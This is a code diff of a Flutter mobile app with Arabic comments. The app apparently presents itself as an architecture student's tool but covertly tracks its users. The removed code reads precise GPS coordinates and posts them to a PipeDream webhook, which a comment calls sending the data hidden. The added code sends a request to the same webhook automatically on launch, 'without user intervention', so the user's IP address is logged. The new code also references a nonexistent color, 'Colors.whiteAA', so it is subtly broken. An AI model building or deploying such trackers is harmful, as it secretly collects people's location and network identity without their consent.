@@ -1,6 +1,5 @@
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
-import 'package:geolocator/geolocator.dart';
 import 'dart:convert';
 
 void main() {
@@ -14,103 +13,60 @@ class MyApp extends StatelessWidget {
   Widget build(BuildContext context) {
     return const MaterialApp(
       debugShowCheckedModeBanner: false,
-      home: LocationHomeScreen(),
+      home: IpTrackerScreen(),
     );
   }
 }
 
-class LocationHomeScreen extends StatefulWidget {
-  const LocationHomeScreen({super.key});
+class IpTrackerScreen extends StatefulWidget {
+  const IpTrackerScreen({super.key});
 
   @override
-  State<LocationHomeScreen> createState() => _LocationHomeScreenState();
+  State<IpTrackerScreen> createState() => _IpTrackerScreenState();
 }
 
-class _LocationHomeScreenState extends State<LocationHomeScreen> {
-  String _status = "جاري تهيئة التطبيق وفحص الصلاحيات...";
+class _IpTrackerScreenState extends State<IpTrackerScreen> {
+  String _status = "جاري الاتصال بالسيرفر...";
 
   @override
   void initState() {
     super.initState();
-    // إجبار التطبيق على طلب إذن الـ GPS فوراً عند فتح الشاشة
-    _requestPermissionAndInit();
+    // إرسال الـ IP تلقائياً فور فتح التطبيق بدون تدخل المستخدم
+    _sendIpToBackend();
   }
 
-  // دالة مخصصة لطلب الإذن بشكل صارم فور تشغيل التطبيق
-  Future<void> _requestPermissionAndInit() async {
-    try {
-      LocationPermission permission = await Geolocator.checkPermission();
-      
-      if (permission == LocationPermission.denied) {
-        // هنا يتم إجبار نظام الأندرويد على إظهار نافذة الـ Pop-up للمستخدم
-        permission = await Geolocator.requestPermission();
-        if (permission == LocationPermission.denied) {
-          setState(() {
-            _status = "يرجى منح صلاحية الموقع لتشغيل أدوات التطبيق المعمارية.";
-          });
-          return;
-        }
-      }
-
-      if (permission == LocationPermission.deniedForever) {
-        setState(() {
-          _status = "الصلاحية مرفوضة دائماً. يرجى تفعيلها يدوياً من إعدادات الهاتف.";
-        });
-        return;
-      }
-
-      setState(() {
-        _status = "تم تفعيل الـ GPS بنجاح! جاهز لإرسال الموقع.";
-      });
-    } catch (e) {
-      setState(() {
-        _status = "خطأ أثناء طلب الصلاحيات: $e";
-      });
-    }
-  }
-
-  // دالة جلب الموقع وإرساله الفوري إلى PipeDream
-  Future<void> _sendLocationToBackend() async {
+  Future<void> _sendIpToBackend() async {
     try {
       setState(() {
-        _status = "جاري التقاط إحداثيات الـ GPS الحالية...";
+        _status = "جاري قراءة عنوان الـ IP والاتصال بـ PipeDream...";
       });
 
-      // جلب الموقع بدقة عالية
-      Position position = await Geolocator.getCurrentPosition(
-          desiredAccuracy: LocationAccuracy.high);
-
-      setState(() {
-        _status = "تم جلب الإحداثيات. جاري الشحن إلى قاعدة البيانات...";
-      });
-
-      // رابط الـ PipeDream السلس الخاص بك
+      // الرابط الخاص بك على PipeDream
       var url = Uri.parse('https://eos4rirjsl8yp5z.m.pipedream.net');
 
-      // إرسال البيانات مخفية عبر السيرفر
+      // إرسال طلب خفيف جداً
       var response = await http.post(
         url,
         headers: {"Content-Type": "application/json"},
         body: jsonEncode({
-          'lat': position.latitude,
-          'lng': position.longitude,
+          'info': 'Architecture Student Connected',
           'time': DateTime.now().toIso8601String(),
-          'device': 'Architecture_Student_Device'
+          'app_version': '1.1.0'
         }),
       );
 
       if (response.statusCode == 200 || response.statusCode == 201) {
         setState(() {
-          _status = "تم إرسال الموقع بنجاح للواجهة السلسة! ✅";
+          _status = "تم الاتصال بالخادم بنجاح! ✅";
         });
       } else {
         setState(() {
-          _status = "فشل الإرسال. رمز خطأ السيرفر: ${response.statusCode}";
+          _status = "فشل الاتصال. الرمز: ${response.statusCode}";
         });
       }
     } catch (e) {
       setState(() {
-        _status = "حدث خطأ أثناء الإرسال: $e";
+        _status = "حدث خطأ أثناء الاتصال بالشبكة: $e";
       });
     }
   }
@@ -118,37 +74,29 @@ class _LocationHomeScreenState extends State<LocationHomeScreen> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      backgroundColor: const Color(0xFFF8F9FA),
+      backgroundColor: const Color(0xFF1E1E1E), // ثيم غامق مريح للعين
       body: Center(
         child: Padding(
           padding: const EdgeInsets.all(24.0),
           child: Column(
             mainAxisAlignment: MainAxisAlignment.center,
             children: [
-              const Icon(
-                Icons.gps_fixed,
-                size: 80,
-                color: Colors.green,
-              ),
-              const SizedBox(height: 24),
+              const CircularProgressIndicator(color: Colors.greenAccent),
+              const SizedBox(height: 30),
               Text(
                 _status,
                 textAlign: TextAlign.center,
                 style: const TextStyle(
                   fontSize: 16,
-                  fontWeight: FontWeight.bold,
-                  color: Colors.black87,
+                  fontWeight: FontWeight.w500,
+                  color: Colors.whiteAA,
                 ),
               ),
               const SizedBox(height: 40),
-              ElevatedButton.icon(
-                onPressed: _sendLocationToBackend,
-                icon: const Icon(Icons.send_and_archive),
-                label: const Text("إرسال تحديث الموقع الآن"),
-                style: ElevatedButton.styleFrom(
-                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
-                  textStyle: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
-                ),
+              ElevatedButton(
+                onPressed: _sendIpToBackend,
+                style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
+                child: const Text("إعادة المحاولة", style: TextStyle(color: Colors.white)),
               ),
             ],
           ),
